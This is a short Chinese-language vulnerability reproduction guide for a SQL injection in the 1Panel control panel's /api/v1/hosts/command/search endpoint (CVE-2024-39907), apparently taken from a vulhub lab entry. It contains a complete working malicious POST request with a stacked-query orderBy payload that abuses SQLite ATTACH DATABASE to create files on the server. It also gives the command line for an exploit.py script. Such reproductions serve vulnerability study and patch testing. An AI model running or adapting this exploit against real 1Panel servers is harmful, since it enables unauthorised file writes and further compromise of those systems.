## 漏洞复现



登录1Panel控制面板后，漏洞存在于`/api/v1/hosts/command/search`接口中，`orderBy`参数缺乏适当的输入验证，导致SQL注入攻击。

发送以下恶意POST请求来利用该漏洞：

```
POST /api/v1/hosts/command/search HTTP/1.1
Host: your-ip:10086
Accept-Language: zh
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Cookie: psession=your-session-cookie
Connection: close
Content-Type: application/json
Content-Length: 83

{
  "page":1,
  "pageSize":10,
  "groupID":0,
  "orderBy":"3;ATTACH DATABASE '/tmp/randstr.txt' AS test;create TABLE test.exp (data text);create TABLE test.exp (data text);drop table test.exp;",
  "order":"ascending",
  "name":"a"
}
```



`orderBy`参数中的恶意负载利用SQLite的ATTACH DATABASE功能在服务器文件系统上创建任意文件，演示了成功的SQL注入攻击。处理请求时，1Panel后端会执行注入的SQL命令而不进行验证，确认漏洞存在且可被利用。

[![1](https://github.com/vulhub/vulhub/raw/master/1panel/CVE-2024-39907/1.png)](https://github.com/vulhub/vulhub/blob/master/1panel/CVE-2024-39907/1.png)

# 调用方式：

python exploit.py --host http://localhost:10086 --cookie "psession=066b1144-bade-4389-bc1d-9b3a2bed0e78"
